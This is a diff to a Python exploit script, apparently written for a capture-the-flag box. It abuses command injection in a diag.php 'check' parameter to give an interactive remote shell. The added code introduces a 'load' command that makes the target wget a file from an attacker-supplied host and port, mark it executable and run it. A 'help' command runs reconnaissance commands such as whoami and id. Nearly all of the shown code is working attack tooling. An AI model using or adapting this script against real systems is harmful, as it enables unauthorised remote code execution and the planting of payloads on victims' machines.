@@ -6,7 +6,7 @@ parser.add_argument('rhost', help='Remote host IP')
 args = parser.parse_args()
 
 USERNAME='admin'
-PASSWORD=''      # Removed since box is still active
+PASSWORD=''		# Removed since box is still live. Put login password here.
 
 def payload(t):
 	return base64.b64encode(('; '+t).encode()).decode()
@@ -33,7 +33,26 @@ def exploit():
 		i = input('RCE@'+args.rhost+'> ')
 		if i=='exit':
 			break
-		r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload(i)},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+		if i.split()[0] == 'load':
+			try:
+				requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('wget '+i.split()[1]+'/'+i.split()[2])},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+				requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('chmod +x '+i.split()[2])},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+				requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('./'+i.split()[2])},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+				r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('ls -la')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+			except:
+				r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('echo Incorrect use: load [host:port] [file]')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+		elif i.split()[0] == 'help':
+			print("""Created by 0xMurphy
+===========================
+load [host:port] [file] --  downloads and executes a file from a host
+help 			-- displays this message
+exit 			-- quits the shell
+===========================
+System Information
+===========================""")
+			r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('pwd; whoami; id; ls -la')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+		else:
+			r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload(i)},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
 		if '<title>Login</title>' in r.text:
 			print('Authentication failed. Reauthenticating...')
 			authenticate()
